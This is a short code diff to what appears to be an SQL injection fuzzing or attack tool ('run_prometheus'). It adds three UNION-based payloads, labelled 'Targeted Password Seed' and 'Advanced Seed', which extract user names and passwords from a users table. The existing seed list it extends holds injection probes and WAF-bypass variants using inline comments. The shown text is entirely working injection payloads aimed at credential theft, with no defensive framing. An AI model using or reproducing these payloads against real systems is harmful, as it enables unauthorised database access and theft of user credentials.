@@ -53,6 +53,9 @@ def run_prometheus():
     if not base_payloads:
         base_payloads = [
           "1 OR 1=1", "1 AND 1=1", "1 OR true", "1 UNION SELECT 1,2", 
+          "1 UNION SELECT user,password FROM users", # Targeted Password Seed
+          "1 UNION SELECT password,NULL FROM users", # Targeted Password Seed
+          "1 UNION SELECT 1,group_concat(user,0x3a,password) FROM users", # Advanced Seed
           "1 UNION SELECT database(),user()", "1 UNION SELECT NULL,NULL",
           "1 || 2=2", "1 && 3=3", "1 XOR 1=2", "1 UNION/*bypass*/SELECT 1,2",
           "1/*!50000UNION*//*!50000SELECT*/1,2"
